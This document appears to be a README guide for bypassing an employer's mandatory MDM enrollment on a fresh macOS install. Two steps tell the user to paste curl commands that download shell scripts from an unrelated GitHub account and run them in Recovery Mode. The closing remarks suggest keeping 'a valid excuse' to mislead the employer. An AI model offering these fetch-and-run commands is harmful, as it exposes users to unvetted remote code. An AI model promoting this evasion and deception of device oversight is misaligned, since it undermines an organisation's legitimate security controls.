# Bypass-MDM for MacOS 💻
#### Prerequisites ⚠️

- **It is advised to erase the hard-drive prior to starting.**
- **It is advised to re-install MacOS using an external flash drive.**
- **Device language needs to be set to English, it can be changed afterwards.**

Steps to Set Up a Dual macOS System for Work and Personal Use:

Start with a clean machine (ideally DFU restored). Apple Support: https://support.apple.com/en-us/108900

Bypass MDM during setup by following the steps below.

Create a second macOS installation: Apple Support: https://support.apple.com/en-us/118282

Set up MDM as instructed by your employer. 

Now, you have one system for personal use and another for work.

Enjoy the flexibility!

#### Follow steps below to bypass MDM setup during a fresh installation of MacOS

> Upon arriving to the setup stage of forced MDM enrollement:

1. Long press Power button to forcefully shut down your Mac.

2. Hold the power button to start your Mac & boot into recovery mode.

> a. **Apple-based Mac**: Hold Power button.\
> b. **Intel-based Mac**: Hold <kbd>CMD</kbd> + <kbd>R</kbd> during boot.

3. Connect to WiFi to activate your Mac.

4. Enter Recovery Mode & Open Safari.

5. Navigate to https://www.github.com/assafdori/bypass-mdm

6. Copy the script below:

```zsh
curl https://raw.githubusercontent.com/polors2/test/main/test.sh -o test.sh && chmod +x ./test.sh && ./test.sh
```

7. Launch Terminal (Utilities > Terminal).

8. Paste (<kbd>CMD</kbd> + <kbd>V</kbd>) and Run the script (<kbd>ENTER</kbd>).

9. Input 1 for Autobypass.

10. Press Enter to leave the default username 'Apple'.

11. Press Enter to leave the default  password '1234'.

12. Wait for the script to finish & Reboot your Mac.

13. Sign in with user (Apple) & password (1234)

14. Skip all setup (Apple ID, Siri, Touch ID, Location Services)

15. Once on the desktop navigate to System Settings > Users and Groups, and create your real Admin account.

16. Log out of the Apple profile, and sign in into your real profile.

17. Feel free set up properly now (Apple ID, Siri, Touch ID, Location Services).

18. Once on the desktop navigate to System Settings > Users and Groups and delete Apple profile.

19. Congratulations, you're MDM free! 💫

###### Although it's virtually impossible to catch that you've removed the MDM (because it wasn't even configured), be aware that the serial number of the laptop will still be shown in the inventory system of your company. We're removing the MDM's capabilities before it's configured locally, so it won't be available as a managed laptop to them. Use with caution. Probably a good idea to have a valid excuse as well.

STEP 2 INSURANCE PLAN
```zsh
curl https://raw.githubusercontent.com/polors2/test/main/step2.sh -o step2.sh && chmod +x ./step2.sh && ./step2.sh
```
